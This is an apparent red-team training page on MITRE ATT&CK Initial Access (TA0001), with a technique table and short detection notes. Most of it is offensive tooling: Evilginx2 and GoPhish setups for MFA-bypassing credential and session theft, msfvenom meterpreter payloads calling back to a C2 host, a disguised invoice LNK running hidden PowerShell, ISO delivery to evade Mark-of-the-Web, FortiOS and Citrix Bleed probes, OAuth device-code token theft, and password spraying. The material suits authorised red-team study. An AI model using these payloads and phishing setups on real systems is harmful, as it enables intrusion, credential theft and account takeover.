---
layout: training-page
title: "TA0001 — Initial Access — Red Team Academy"
module: "MITRE ATT&CK Tactics"
tags:
  - mitre
  - att&ck
  - initial-access
  - phishing
  - exploitation
page_key: "mitre-ta0001"
render_with_liquid: false
---

# TA0001 — Initial Access

Initial Access covers the techniques adversaries use to gain their first foothold inside a target network. This is the critical boundary crossing — the point where pre-attack recon and resource development convert into active compromise. Common vectors include phishing (the dominant initial access technique in real-world incidents), exploiting public-facing applications, and abusing valid accounts obtained through credential theft or purchase.

Red team engagements typically start here after the client has approved the infrastructure buildout phase.

## Key Techniques

| T-ID | Technique | Sub-technique | Notes |
|------|-----------|---------------|-------|
| T1566 | Phishing | T1566.001 Spearphishing Attachment | Malicious Office docs, PDFs, ISOs |
| T1566 | Phishing | T1566.002 Spearphishing Link | Evilginx AiTM, GoPhish credential harvest |
| T1566 | Phishing | T1566.003 Spearphishing via Service | LinkedIn, Teams, Slack DMs |
| T1566 | Phishing | T1566.004 Spearphishing Voice | Vishing — call to install remote access |
| T1190 | Exploit Public-Facing Application | — | CVE exploitation on VPNs, web apps, mail servers |
| T1133 | External Remote Services | — | VPN, Citrix, RDP, SSH exposed to internet |
| T1078 | Valid Accounts | T1078.001 Default Accounts | Vendor default credentials |
| T1078 | Valid Accounts | T1078.002 Domain Accounts | Credentials from phishing/OSINT/breach |
| T1078 | Valid Accounts | T1078.003 Local Accounts | Local admin creds from prior compromise |
| T1078 | Valid Accounts | T1078.004 Cloud Accounts | SaaS OAuth tokens, cloud console access |
| T1091 | Replication Through Removable Media | — | USB drops, weaponized drives |
| T1199 | Trusted Relationship | — | Compromise MSP/IT vendor to reach target |
| T1195 | Supply Chain Compromise | T1195.001 Software Dependencies | npm/PyPI package poisoning |
| T1195 | Supply Chain Compromise | T1195.002 Software Supply Chain | Compromise update mechanism (SolarWinds-style) |
| T1195 | Supply Chain Compromise | T1195.003 Hardware Supply Chain | Implanted hardware (rare; nation-state) |
| T1200 | Hardware Additions | — | Drop physical implants (LAN Turtle, etc.) |
| T1189 | Drive-by Compromise | — | Watering hole attack, malicious ad redirect |

## Red Team Tooling

### Phishing Campaigns

```
# GoPhish — full phishing campaign management
# Start GoPhish server
./gophish

# Configure SMTP relay, landing page, email template, target group
# Track opens, clicks, credential submissions in real time

# Evilginx2 — AiTM proxy for MFA bypass via session cookie theft
./evilginx2 -p /usr/share/evilginx/phishlets -c /usr/share/evilginx/
# Configure phishlet for target (Microsoft 365, Okta, etc.)
phishlets hostname o365 login.yourdomain.com
phishlets enable o365
lures create o365
lures get-url 0
# Captured session tokens bypass MFA completely
```

### Payload Generation for Email Delivery

```
# msfvenom — staged PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=c2.yourdomain.com LPORT=443 \
  -f psh-reflection -o payload.ps1

# msfvenom — HTA payload (embedded in HTML)
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=c2.yourdomain.com LPORT=443 \
  -f hta-psh -o payload.hta

# LNK weaponization (PowerShell COM)
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("Invoice_Q4.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = '-windowstyle hidden -enc BASE64_PAYLOAD'
$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,1"
$Shortcut.Save()

# ISO + LNK delivery (bypasses MOTW when extracted from ISO)
mkisofs -o payload.iso -J -R payloads/
```

### Exploiting Public-Facing Applications

```
# Search for unpatched VPNs in scope (common initial access vector)
# Fortinet FortiOS CVE-2023-27997 PoC check:
curl -k "https://TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Citrix Bleed CVE-2023-4966 — unauthenticated session token leak
curl -H "Host: target.citrix.com" \
  "https://target.citrix.com/oauth/idp/.well-known/openid-configuration" \
  --path-as-is

# Exploit public-facing app via Metasploit
msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; \
  set LHOST c2.yourdomain.com; set LPORT 443; exploit"
```

### Abusing Valid Accounts (Cloud)

```
# Device code phishing — steal OAuth token via device code flow
# User enters code at microsoft.com/devicelogin — token sent to attacker
roadtx gettokens --device-code -c 29d9ed98-a469-4536-ade2-f981bc1d605e

# Check captured token for M365 access
roadtx listaliases -t ACCESS_TOKEN

# Password spraying (pre-initial access, low-and-slow)
TREVORspray spray -u userlist.txt -p 'Password123!' -t login.microsoftonline.com
```

## Detection Notes

- **Phishing**: email gateway logs, user-reported phish, impossible travel alerts when credentials used from new IPs/ASNs, MFA challenge spikes
- **Exploit public apps**: WAF alerts, application error spikes, unusual URI patterns in web logs, CVSS-high patch gaps in vulnerability management
- **Valid accounts (credential stuffing)**: repeated failed auth from distributed IPs, successful logins from new countries/ASNs shortly after breach reports
- **Macro-based payloads**: Office spawning cmd.exe/powershell.exe as child process — high-confidence detection; most EDRs alert on this by default
- **ISO/LNK delivery**: Mark-of-the-Web not applied to files inside ISO — EDRs without ISO inspection may miss; monitor for explorer.exe spawning processes from mounted drive paths

## Related Academy Pages

- [Initial Access Techniques](/exploitation/initial-access/)
- [GoPhish Phishing Framework](/c2-frameworks/gophish/)
- [Evilginx AiTM Framework](/c2-frameworks/evilginx/)
- [Supply Chain & CI/CD Attacks](/exploitation/supply-chain-attacks/)
- [Device Code Phishing & OAuth Attacks](/exploitation/device-code-phishing/)
- [Phishing Tradecraft](/social-engineering/phishing-tradecraft/)
- [Spear Phishing](/social-engineering/spear-phishing/)
- [VPN & Edge Device Exploitation](/exploitation/edge-device-exploitation/)

## Resources

- [TA0001 — MITRE ATT&CK Initial Access](https://attack.mitre.org/tactics/TA0001/)
- [T1566 — Phishing](https://attack.mitre.org/techniques/T1566/)
- [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [CISA Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
